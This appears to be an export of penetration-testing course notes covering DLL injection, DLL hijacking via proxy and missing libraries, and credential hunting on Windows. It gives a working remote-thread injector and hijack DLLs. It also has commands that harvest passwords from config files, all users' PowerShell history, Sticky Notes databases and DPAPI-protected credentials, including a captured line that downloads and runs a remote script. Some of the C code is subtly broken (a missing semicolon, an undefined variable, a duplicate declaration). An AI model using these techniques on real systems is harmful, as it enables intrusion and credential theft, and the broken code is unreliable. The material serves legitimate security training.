    "content": "# DLL Injection\n\n`DLL injection` is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. This technique allows the inserted code to run within the process's context, thereby influencing its behavior or accessing its resources.\n\n`DLL injection` finds legitimate applications in various areas. For instance, software developers leverage this technology for `hot patching`, a method that enables the amendment or updating of code seamlessly, without the need to restart the ongoing process immediately. A prime example of this is [Azure's use of hot patching for updating operational servers](https://learn.microsoft.com/en-us/azure/automanage/automanage-hotpatch#how-hotpatch-works), which facilitates the benefits of the update without necessitating server downtime.\n\nNevertheless, it's not entirely innocuous. Cybercriminals often manipulate `DLL injection` to insert malicious code into trusted processes. This technique is particularly effective in evading detection by security software.\n\nThere are several different methods for actually executing a DLL injection.\n\n## LoadLibrary\n\n`LoadLibrary` is a widely utilized method for DLL injection, employing the `LoadLibrary` API to load the DLL into the target process's address space.\n\nThe `LoadLibrary` API is a function provided by the Windows operating system that loads a Dynamic Link Library (DLL) into the current process’s memory and returns a handle that can be used to get the addresses of functions within the DLL.\n\nCode: c\n\n```c\n#include <windows.h>\n#include <stdio.h>\n\nint main() {\n    // Using LoadLibrary to load a DLL into the current process\n    HMODULE hModule = LoadLibrary(\"example.dll\");\n    if (hModule == NULL) {\n        printf(\"Failed to load example.dll\\n\");\n        return -1;\n    }\n    printf(\"Successfully loaded example.dll\\n\");\n\n    return 0;\n}\n```\n\nThe first example shows how `LoadLibrary` can be used to load a DLL into the current process legitimately.\n\nCode: c\n\n```c\n#include <windows.h>\n#include <stdio.h>\n\nint main() {\n    // Using LoadLibrary for DLL injection\n    // First, we need to get a handle to the target process\n    DWORD targetProcessId = 123456 // The ID of the target process\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);\n    if (hProcess == NULL) {\n        printf(\"Failed to open target process\\n\");\n        return -1;\n    }\n\n    // Next, we need to allocate memory in the target process for the DLL path\n    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\n    if (dllPathAddressInRemoteMemory == NULL) {\n        printf(\"Failed to allocate memory in target process\\n\");\n        return -1;\n    }\n\n    // Write the DLL path to the allocated memory in the target process\n    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);\n    if (!succeededWriting) {\n        printf(\"Failed to write DLL path to target process\\n\");\n        return -1;\n    }\n\n    // Get the address of LoadLibrary in kernel32.dll\n    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\");\n    if (loadLibraryAddress == NULL) {\n        printf(\"Failed to get address of LoadLibraryA\\n\");\n        return -1;\n    }\n\n    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path\n    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);\n    if (hThread == NULL) {\n        printf(\"Failed to create remote thread in target process\\n\");\n        return -1;\n    }\n\n    printf(\"Successfully injected example.dll into target process\\n\");\n\n    return 0;\n}\n```\n\nThe second example illustrates the use of `LoadLibrary` for DLL injection. This process involves allocating memory within the target process for the DLL path and then initiating a remote thread that begins at `LoadLibrary` and directs towards the DLL path.\n\n## Manual Mapping\n\n`Manual Mapping` is an incredibly complex and advanced method of DLL injection. It involves the manual loading of a DLL into a process's memory and resolves its imports and relocations. However, it avoids easy detection by not using the `LoadLibrary` function, whose usage is monitored by security and anti-cheat systems.\n\nA simplified outline of the process can be represented as follows:\n\n1. Load the DLL as raw data into the injecting process.\n2. Map the DLL sections into the targeted process.\n3. Inject shellcode into the target process and execute it. This shellcode relocates the DLL, rectifies the imports, executes the Thread Local Storage (TLS) callbacks, and finally calls the DLL main.\n\n## Reflective DLL Injection\n\n`Reflective DLL injection` is a technique that utilizes reflective programming to load a library from memory into a host process. The library itself is responsible for its loading process by implementing a minimal Portable Executable (PE) file loader. This allows it to decide how it will load and interact with the host, minimising interaction with the host system and process.\n\n[Stephen Fewer has a great GitHub](https://github.com/stephenfewer/ReflectiveDLLInjection) demonstrating the technique. Borrowing his explanation below:\n\n\"The procedure of remotely injecting a library into a process is two-fold. First, the library you aim to inject must be written into the target process’s address space (hereafter referred to as the 'host process'). Second, the library must be loaded into the host process to meet the library's runtime expectations, such as resolving its imports or relocating it to an appropriate location in memory.\n\nAssuming we have code execution in the host process and the library we aim to inject has been written into an arbitrary memory location in the host process, Reflective DLL Injection functions as follows.\n\n1. Execution control is transferred to the library's `ReflectiveLoader` function, an exported function found in the library's export table. This can happen either via `CreateRemoteThread()` or a minimal bootstrap shellcode.\n2. As the library's image currently resides in an arbitrary memory location, the `ReflectiveLoader` initially calculates its own image's current memory location to parse its own headers for later use.\n3. The `ReflectiveLoader` then parses the host process's `kernel32.dll` export table to calculate the addresses of three functions needed by the loader, namely `LoadLibraryA`, `GetProcAddress`, and `VirtualAlloc`.\n4. The `ReflectiveLoader` now allocates a continuous memory region where it will proceed to load its own image. The location isn't crucial; the loader will correctly relocate the image later.\n5. The library's headers and sections are loaded into their new memory locations.\n6. The `ReflectiveLoader` then processes the newly loaded copy of its image's import table, loading any additional libraries and resolving their respective imported function addresses.\n7. The `ReflectiveLoader` then processes the newly loaded copy of its image's relocation table.\n8. The `ReflectiveLoader` then calls its newly loaded image's entry point function, `DllMain,` with `DLL_PROCESS_ATTACH`. The library has now been successfully loaded into memory.\n9. Finally, the `ReflectiveLoader` returns execution to the initial bootstrap shellcode that called it, or if it were called via `CreateRemoteThread`, the thread would terminate.\"\n\n## DLL Hijacking\n\n`DLL Hijacking` is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL, hence rendering it susceptible to such attacks.\n\nThe default DLL search order used by the system depends on whether `Safe DLL Search Mode` is activated. When enabled (which is the default setting), Safe DLL Search Mode repositions the user's current directory further down in the search order. It’s easy to either enable or disable the setting by editing the registry.\n\n1. Press `Windows key + R` to open the Run dialog box.\n2. Type in `Regedit` and press `Enter`. This will open the Registry Editor.\n3. Navigate to `HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager`.\n4. In the right pane, look for the `SafeDllSearchMode` value. If it does not exist, right-click the blank space of the folder or right-click the `Session Manager` folder, select `New` and then `DWORD (32-bit) Value`. Name this new value as `SafeDllSearchMode`.\n5. Double-click `SafeDllSearchMode`. In the Value data field, enter `1` to enable and `0` to disable Safe DLL Search Mode.\n6. Click `OK`, close the Registry Editor and Reboot the system for the changes to take effect.\n\nWith this mode enabled, applications search for necessary DLL files in the following sequence:\n\n1. The directory from which the application is loaded.\n2. The system directory.\n3. The 16-bit system directory.\n4. The Windows directory.\n5. The current directory.\n6. The directories that are listed in the PATH environment variable.\n\nHowever, if 'Safe DLL Search Mode' is deactivated, the search order changes to:\n\n1. The directory from which the application is loaded.\n2. The current directory.\n3. The system directory.\n4. The 16-bit system directory.\n5. The Windows directory\n6. The directories that are listed in the PATH environment variable\n\nDLL Hijacking involves a few more steps. First, you need to pinpoint a DLL the target is attempting to locate. Specific tools can simplify this task:\n\n1. `Process Explorer`: Part of Microsoft's Sysinternals suite, this tool offers detailed information on running processes, including their loaded DLLs. By selecting a process and inspecting its properties, you can view its DLLs.\n2. `PE Explorer`: This Portable Executable (PE) Explorer can open and examine a PE file (such as a .exe or .dll). Among other features, it reveals the DLLs from which the file imports functionality.\n\nAfter identifying a DLL, the next step is determining which functions you want to modify, which necessitates reverse engineering tools, such as disassemblers and debuggers. Once the functions and their signatures have been identified, it's time to construct the DLL.\n\nLet’s take a practical example. Consider the C program below:\n\nCode: c\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <windows.h>\n\ntypedef int (*AddFunc)(int, int);\n\nint readIntegerInput()\n{\n    int value;\n    char input[100];\n    bool isValid = false;\n\n    while (!isValid)\n    {\n        fgets(input, sizeof(input), stdin);\n\n        if (sscanf(input, \"%d\", &value) == 1)\n        {\n            isValid = true;\n        }\n        else\n        {\n            printf(\"Invalid input. Please enter an integer: \");\n        }\n    }\n\n    return value;\n}\n\nint main()\n{\n    HMODULE hLibrary = LoadLibrary(\"library.dll\");\n    if (hLibrary == NULL)\n    {\n        printf(\"Failed to load library.dll\\n\");\n        return 1;\n    }\n\n    AddFunc add = (AddFunc)GetProcAddress(hLibrary, \"Add\");\n    if (add == NULL)\n    {\n        printf(\"Failed to locate the 'Add' function\\n\");\n        FreeLibrary(hLibrary);\n        return 1;\n    }\n    HMODULE hLibrary = LoadLibrary(\"x.dll\");\n\n    printf(\"Enter the first number: \");\n    int a = readIntegerInput();\n\n    printf(\"Enter the second number: \");\n    int b = readIntegerInput();\n\n    int result = add(a, b);\n    printf(\"The sum of %d and %d is %d\\n\", a, b, result);\n\n    FreeLibrary(hLibrary);\n    system(\"pause\");\n    return 0;\n}\n```\n\nIt loads an `add` function from the `library.dll` and utilises this function to add two numbers. Subsequently, it prints the result of the addition. By examining the program in Process Monitor (procmon), we can observe the process of loading the `library.dll` located in the same directory.\n\nFirst, let's set up a filter in procmon to solely include `main.exe`, which is the process name of the program. This filter will help us focus specifically on the activities related to the execution of `main.exe`. It is important to note that procmon only captures information while it is actively running. Therefore, if your log appears empty, you should close `main.exe` and reopen it while procmon is running. This will ensure that the necessary information is captured and available for analysis.\n\n![Process Monitor window with filter settings open. Filters include 'Operation is Load Image' and process names like main.exe included, others like Procmon.exe excluded.](https://academy.hackthebox.com/storage/modules/67/procmon.png)\n\nThen if you scroll to the bottom, you can see the call to load `library.dll`.\n\n![Process Monitor window displaying multiple entries for main.exe with operations like RegOpenKey, RegQueryValue, and Load Image. Results show SUCCESS and NAME NOT FOUND.](https://academy.hackthebox.com/storage/modules/67/procmon-loadimage.png)\n\nWe can further filter for an `Operation` of `Load Image` to only get the libraries the app is loading.\n\nDLL Injection\n\n```shell-session\n16:13:30,0074709\tmain.exe\t47792\tLoad Image\tC:\\Users\\PandaSt0rm\\Desktop\\Hijack\\main.exe\tSUCCESS\tImage Base: 0xf60000, Image Size: 0x26000\n16:13:30,0075369\tmain.exe\t47792\tLoad Image\tC:\\Windows\\System32\\ntdll.dll\tSUCCESS\tImage Base: 0x7ffacdbf0000, Image Size: 0x214000\n16:13:30,0075986\tmain.exe\t47792\tLoad Image\tC:\\Windows\\SysWOW64\\ntdll.dll\tSUCCESS\tImage Base: 0x77a30000, Image Size: 0x1af000\n16:13:30,0120867\tmain.exe\t47792\tLoad Image\tC:\\Windows\\System32\\wow64.dll\tSUCCESS\tImage Base: 0x7ffacd5a0000, Image Size: 0x57000\n16:13:30,0122132\tmain.exe\t47792\tLoad Image\tC:\\Windows\\System32\\wow64base.dll\tSUCCESS\tImage Base: 0x7ffacd370000, Image Size: 0x9000\n16:13:30,0123231\tmain.exe\t47792\tLoad Image\tC:\\Windows\\System32\\wow64win.dll\tSUCCESS\tImage Base: 0x7ffacc750000, Image Size: 0x8b000\n16:13:30,0124204\tmain.exe\t47792\tLoad Image\tC:\\Windows\\System32\\wow64con.dll\tSUCCESS\tImage Base: 0x7ffacc850000, Image Size: 0x16000\n16:13:30,0133468\tmain.exe\t47792\tLoad Image\tC:\\Windows\\System32\\wow64cpu.dll\tSUCCESS\tImage Base: 0x77a20000, Image Size: 0xa000\n16:13:30,0144586\tmain.exe\t47792\tLoad Image\tC:\\Windows\\SysWOW64\\kernel32.dll\tSUCCESS\tImage Base: 0x76460000, Image Size: 0xf0000\n16:13:30,0146299\tmain.exe\t47792\tLoad Image\tC:\\Windows\\SysWOW64\\KernelBase.dll\tSUCCESS\tImage Base: 0x75dd0000, Image Size: 0x272000\n16:13:31,7974779\tmain.exe\t47792\tLoad Image\tC:\\Users\\PandaSt0rm\\Desktop\\Hijack\\library.dll\tSUCCESS\tImage Base: 0x6a1a0000, Image Size: 0x1d000\n```\n\n### Proxying\n\nWe can utilize a method known as DLL Proxying to execute a Hijack. We will create a new library that will load the function `Add` from `library.dll`, tamper with it, and then return it to `main.exe`.\n\n1. Create a new library: We will create a new library serving as the proxy for `library.dll`. This library will contain the necessary code to load the `Add` function from `library.dll` and perform the required tampering.\n2. Load the `Add` function: Within the new library, we will load the `Add` function from the original `library.dll`. This will allow us to access the original function.\n3. Tamper with the function: Once the `Add` function is loaded, we can then apply the desired tampering or modifications to its result. In this case, we are simply going to modify the result of the addition, to add `+ 1` to the result.\n4. Return the modified function: After completing the tampering process, we will return the modified `Add` function from the new library back to `main.exe`. This will ensure that when `main.exe` calls the `Add` function, it will execute the modified version with the intended changes.\n\nThe code is as follows:\n\nCode: c\n\n```c\n// tamper.c\n#include <stdio.h>\n#include <Windows.h>\n\n#ifdef _WIN32\n#define DLL_EXPORT __declspec(dllexport)\n#else\n#define DLL_EXPORT\n#endif\n\ntypedef int (*AddFunc)(int, int);\n\nDLL_EXPORT int Add(int a, int b)\n{\n    // Load the original library containing the Add function\n    HMODULE originalLibrary = LoadLibraryA(\"library.o.dll\");\n    if (originalLibrary != NULL)\n    {\n        // Get the address of the original Add function from the library\n        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, \"Add\");\n        if (originalAdd != NULL)\n        {\n            printf(\"============ HIJACKED ============\\n\");\n            // Call the original Add function with the provided arguments\n            int result = originalAdd(a, b);\n            // Tamper with the result by adding +1\n            printf(\"= Adding 1 to the sum to be evil\\n\");\n            result += 1;\n            printf(\"============ RETURN ============\\n\");\n            // Return the tampered result\n            return result;\n        }\n    }\n    // Return -1 if the original library or function cannot be loaded\n    return -1;\n}\n```\n\nEither compile it or use the precompiled version provided. Rename `library.dll` to `library.o.dll`, and rename `tamper.dll` to `library.dll`.\n\nRunning `main.exe` then shows the successful hack.\n\n![Command prompt showing a program that adds two numbers. Input: 1 and 1. Output: 'HIJACKED' message, adding 1 to the sum, resulting in 3 instead of 2.](https://academy.hackthebox.com/storage/modules/67/proxy.png)\n\n### Invalid Libraries\n\nAnother option to execute a DLL Hijack attack is to replace a valid library the program is attempting to load but cannot find with a crafted library. If we change the procmon filter to focus on entries whose path ends in `.dll` and has a status of `NAME NOT FOUND` we can find such libraries in `main.exe`.\n\n![Process Monitor window showing multiple 'CreateFile' operations by main.exe. Paths include various DLL files. Results mostly 'NAME NOT FOUND' with details on desired access and attributes.](https://academy.hackthebox.com/storage/modules/67/procmon-not-found.png)\n\nAs we know, `main.exe` searches in many locations looking for `x.dll`, but it doesn’t find it anywhere. The entry we are particularly interested in is:\n\nDLL Injection\n\n```shell-session\n17:55:39,7848570\tmain.exe\t37940\tCreateFile\tC:\\Users\\PandaSt0rm\\Desktop\\Hijack\\x.dll\tNAME NOT FOUND\tDesired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a\n```\n\nWhere it is looking to load `x.dll` from the app directory. We can take advantage of this and load our own code, with very little context of what it is looking for in `x.dll`.\n\nCode: c\n\n```c\n#include <stdio.h>\n#include <Windows.h>\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n    {\n        printf(\"Hijacked... Oops...\\n\");\n    }\n    break;\n    case DLL_PROCESS_DETACH:\n        break;\n    case DLL_THREAD_ATTACH:\n        break;\n    case DLL_THREAD_DETACH:\n        break;\n    }\n    return TRUE;\n}\n```\n\nThis code defines a DLL entry point function called `DllMain` that is automatically called by Windows when the DLL is loaded into a process. When the library is loaded, it will simply print `Hijacked... Oops...` to the terminal, but you could theoretically do anything here.\n\nEither compile it or use the precompiled version provided. Rename `hijack.dll` to `x.dll`, and run `main.exe`.\n\n![Command prompt showing a program that adds two numbers. Input: 1 and 1. Output: 'Hijacked... Oops...' message, sum is correctly displayed as 2.](https://academy.hackthebox.com/storage/modules/67/hijack.png)",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/22-Credential Hunting",
    "path": "02_CPTS/17-Windows Privilege Escalation/22-Credential Hunting.md",
    "title": "22 Credential Hunting",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Credential Hunting --- Credentials can unlock many doors for us during our assessments. We may find credentials during our privilege escalation enumeration that can lead directly to local admin access...",
    "category": "02_CPTS",
    "content": "# Credential Hunting\n\n---\n\nCredentials can unlock many doors for us during our assessments. We may find credentials during our privilege escalation enumeration that can lead directly to local admin access, grant us a foothold into the Active Directory domain environment, or even be used to escalate privileges within the domain. There are many places that we may find credentials on a system, some more obvious than others.\n\n---\n\n## Application Configuration Files\n\n#### Searching for Files\n\nAgainst best practices, applications often store passwords in cleartext config files. Suppose we gain command execution in the context of an unprivileged user account. In that case, we may be able to find credentials for their admin account or another privileged local or domain account. We can use the [findstr](https://ss64.com/nt/findstr.html) utility to search for this sensitive information.\n\nCredential Hunting\n\n```powershell-session\nPS C:\\htb> findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml\n```\n\nSensitive IIS information such as credentials may be stored in a `web.config` file. For the default IIS website, this could be located at `C:\\inetpub\\wwwroot\\web.config`, but there may be multiple versions of this file in different locations, which we can search for recursively.\n\n---\n\n## Dictionary Files\n\n#### Chrome Dictionary Files\n\nAnother interesting case is dictionary files. For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline.\n\nCredential Hunting\n\n```powershell-session\nPS C:\\htb> gc 'C:\\Users\\htb-student\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt' | Select-String password\n\nPassword1234!\n```\n\n---\n\n## Unattended Installation Files\n\nUnattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.\n\n#### Unattend.xml\n\nCode: xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<unattend xmlns=\"urn:schemas-microsoft-com:unattend\">\n    <settings pass=\"specialize\">\n        <component name=\"Microsoft-Windows-Shell-Setup\" processorArchitecture=\"amd64\" publicKeyToken=\"31bf3856ad364e35\" language=\"neutral\" versionScope=\"nonSxS\" xmlns:wcm=\"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n            <AutoLogon>\n                <Password>\n                    <Value>local_4dmin_p@ss</Value>\n                    <PlainText>true</PlainText>\n                </Password>\n                <Enabled>true</Enabled>\n                <LogonCount>2</LogonCount>\n                <Username>Administrator</Username>\n            </AutoLogon>\n            <ComputerName>*</ComputerName>\n        </component>\n    </settings>\n```\n\nAlthough these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.\n\n---\n\n## PowerShell History File\n\nStarting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file:\n\n- `C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt`.\n\n#### Confirming PowerShell History Save Path\n\nAs seen in the (handy) Windows Commands PDF, published by Microsoft [here](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf), there are many commands which can pass credentials on the command line. We can see in the example below that the user-specified local administrative credentials to query the Application Event Log using [wevutil](https://ss64.com/nt/wevtutil.html).\n\nCredential Hunting\n\n```powershell-session\nPS C:\\htb> (Get-PSReadLineOption).HistorySavePath\n\nC:\\Users\\htb-student\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n```\n\n#### Reading PowerShell History File\n\nOnce we know the file's location (the default path is above), we can attempt to read its contents using `gc`.\n\nCredential Hunting\n\n```powershell-session\nPS C:\\htb> gc (Get-PSReadLineOption).HistorySavePath\n\ndir\ncd Temp\nmd backups\ncp c:\\inetpub\\wwwroot\\* .\\backups\\\nSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))\n. .\\Get-IISsite.ps1\nGet-IISsite -Server WEB02 -web \"Default Web Site\"\nwevtutil qe Application \"/q:*[Application [(EventID=3005)]]\" /f:text /rd:true /u:WEB02\\administrator /p:5erv3rAdmin! /r:WEB02\n```\n\nWe can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user. This can also be extremely helpful as a post-exploitation step. We should always recheck these files once we have local admin if our prior access did not allow us to read the files for some users. This command assumes that the default save path is being used.\n\nCredential Hunting\n\n```powershell-session\nPS C:\\htb> foreach($user in ((ls C:\\users).fullname)){cat \"$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\" -ErrorAction SilentlyContinue}\n\ndir\ncd Temp\nmd backups\ncp c:\\inetpub\\wwwroot\\* .\\backups\\\nSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))\n. .\\Get-IISsite.ps1\nGet-IISsite -Server WEB02 -web \"Default Web Site\"\nwevtutil qe Application \"/q:*[Application [(EventID=3005)]]\" /f:text /rd:true /u:WEB02\\administrator /p:5erv3rAdmin! /r:WEB02\n```\n\n---\n\n## PowerShell Credentials\n\nPowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.\n\nTake, for example, the following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily.\n\nCode: powershell\n\n```powershell\n# Connect-VC.ps1\n# Get-Credential | Export-Clixml -Path 'C:\\scripts\\pass.xml'\n$encryptedPassword = Import-Clixml -Path 'C:\\scripts\\pass.xml'\n$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password\nConnect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword\n```\n\n#### Decrypting PowerShell Credentials\n\nIf we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`. The example below assumes the former.\n\nCredential Hunting\n\n```powershell-session\nPS C:\\htb> $credential = Import-Clixml -Path 'C:\\scripts\\pass.xml'\nPS C:\\htb> $credential.GetNetworkCredential().username\n\nbob\n\n\nPS C:\\htb> $credential.GetNetworkCredential().password\n\nStr0ng3ncryptedP@ss!\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/23-Other Files",
    "path": "02_CPTS/17-Windows Privilege Escalation/23-Other Files.md",
    "title": "23 Other Files",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Other Files --- There are many other types of files that we may find on a local system or on network share drives that may contain credentials or additional information that can be used to escalate pr...",
    "category": "02_CPTS",
    "content": "# Other Files\n\n---\n\nThere are many other types of files that we may find on a local system or on network share drives that may contain credentials or additional information that can be used to escalate privileges. In an Active Directory environment, we can use a tool such as [Snaffler](https://github.com/SnaffCon/Snaffler) to crawl network share drives for interesting file extensions such as `.kdbx`, `.vmdk`, `.vdhx`, `.ppk`, etc. We may find a virtual hard drive that we can mount and extract local administrator password hashes from, an SSH private key that can be used to access other systems, or instances of users storing passwords in Excel/Word Documents, OneNote workbooks, or even the classic `passwords.txt` file. I have performed many penetration tests where a password found on a share drive or local drive led to either initial access or privilege escalation. Many companies provide each employee with a folder on a file share mapped to their user id, i.e., the folder `bjones` on the `users` share on a server called `FILE01` with loose permissions applied (i.e., all Domain Users with read access to all user folders). We often find users saving sensitive personal data in these folders, unaware they are accessible to everyone in the network and not just local to their workstation.\n\n---\n\n## Manually Searching the File System for Credentials\n\nWe can search the file system or share drive(s) manually using the following commands from [this cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/).\n\n#### Search File Contents for String - Example 1\n\nOther Files\n\n```cmd-session\nC:\\htb> cd c:\\Users\\htb-student\\Documents & findstr /SI /M \"password\" *.xml *.ini *.txt\n\nstuff.txt\n```\n\n#### Search File Contents for String - Example 2\n\nOther Files\n\n```cmd-session\nC:\\htb> findstr /si password *.xml *.ini *.txt *.config\n\nstuff.txt:password: l#-x9r11_2_GL!\n```\n\n#### Search File Contents for String - Example 3\n\nOther Files\n\n```cmd-session\nC:\\htb> findstr /spin \"password\" *.*\n\nstuff.txt:1:password: l#-x9r11_2_GL!\n```\n\n#### Search File Contents with PowerShell\n\nWe can also search using PowerShell in a variety of ways. Here is one example.\n\nOther Files\n\n```powershell-session\nPS C:\\htb> select-string -Path C:\\Users\\htb-student\\Documents\\*.txt -Pattern password\n\nstuff.txt:1:password: l#-x9r11_2_GL!\n```\n\n#### Search for File Extensions - Example 1\n\nOther Files\n\n```cmd-session\nC:\\htb> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*\n\nc:\\inetpub\\wwwroot\\web.config\n```\n\n#### Search for File Extensions - Example 2\n\nOther Files\n\n```cmd-session\nC:\\htb> where /R C:\\ *.config\n\nc:\\inetpub\\wwwroot\\web.config\n```\n\nSimilarly, we can search the file system for certain file extensions with a command such as:\n\n#### Search for File Extensions Using PowerShell\n\nOther Files\n\n```powershell-session\nPS C:\\htb> Get-ChildItem C:\\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore\n\n\n    Directory: C:\\inetpub\\wwwroot\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         5/25/2021   9:59 AM            329 web.config\n\n<SNIP>\n```\n\n---\n\n## Sticky Notes Passwords\n\nPeople often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at `C:\\Users\\<user>\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite` and is always worth searching for and examining.\n\n#### Looking for StickyNotes DB Files\n\nOther Files\n\n```powershell-session\nPS C:\\htb> ls\n \n \n    Directory: C:\\Users\\htb-student\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\n \n \nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session\n-a----         5/25/2021  11:59 AM            982 Ecs.dat\n-a----         5/25/2021  11:59 AM           4096 plum.sqlite\n-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm\n-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal\n```\n\nWe can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.\n\n![DB Browser for SQLite showing a query 'select Text from Note;' with results. Two entries: one with ID ending in 'c2' and text 'vCenter', another with ID ending in '290' and text 'blah blah blah'.](https://academy.hackthebox.com/storage/modules/67/stickynote.png)\n\n#### Viewing Sticky Notes Data Using PowerShell\n\nThis can also be done with PowerShell using the [PSSQLite module](https://github.com/RamblingCookieMonster/PSSQLite). First, import the module, point to a data source (in this case, the SQLite database file used by the StickNotes app), and finally query the `Note` table and look for any interesting data. This can also be done from our attack machine after downloading the `.sqlite` file or remotely via WinRM.\n\nOther Files\n\n```powershell-session\nPS C:\\htb> Set-ExecutionPolicy Bypass -Scope Process\n\nExecution Policy Change\nThe execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose\nyou to the security risks described in the about_Execution_Policies help topic at\nhttps:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?\n[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is \"N\"): A\n\nPS C:\\htb> cd .\\PSSQLite\\\nPS C:\\htb> Import-Module .\\PSSQLite.psd1\nPS C:\\htb> $db = 'C:\\Users\\htb-student\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite'\nPS C:\\htb> Invoke-SqliteQuery -Database $db -Query \"SELECT Text FROM Note\" | ft -wrap\n \nText\n----\n\\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter\n\\id=e4adae4c-a40b-48b4-93a5-900247852f96\n\\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!\n\\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am\n```\n\n#### Strings to View DB File Contents\n\nWe can also copy them over to our attack box and search through the data using the `strings` command, which may be less efficient depending on the size of the database.\n\nOther Files\n\n```shell-session\ndrxh3kr@htb[/htb]$  strings plum.sqlite-wal\n\nCREATE TABLE \"Note\" (\n\"Text\" varchar ,\n\"WindowPosition\" varchar ,\n\"IsOpen\" integer ,\n\"IsAlwaysOnTop\" integer ,\n\"CreationNoteIdAnchor\" varchar ,\n\"Theme\" varchar ,\n\"IsFutureNote\" integer ,\n\"RemoteId\" varchar ,\n\"ChangeKey\" varchar ,\n\"LastServerVersion\" varchar ,\n\"RemoteSchemaVersion\" integer ,\n\"IsRemoteDataInvalid\" integer ,\n\"PendingInsightsScan\" integer ,\n\"Type\" varchar ,\n\"Id\" varchar primary key not null ,\n\"ParentId\" varchar ,\n\"CreatedAt\" bigint 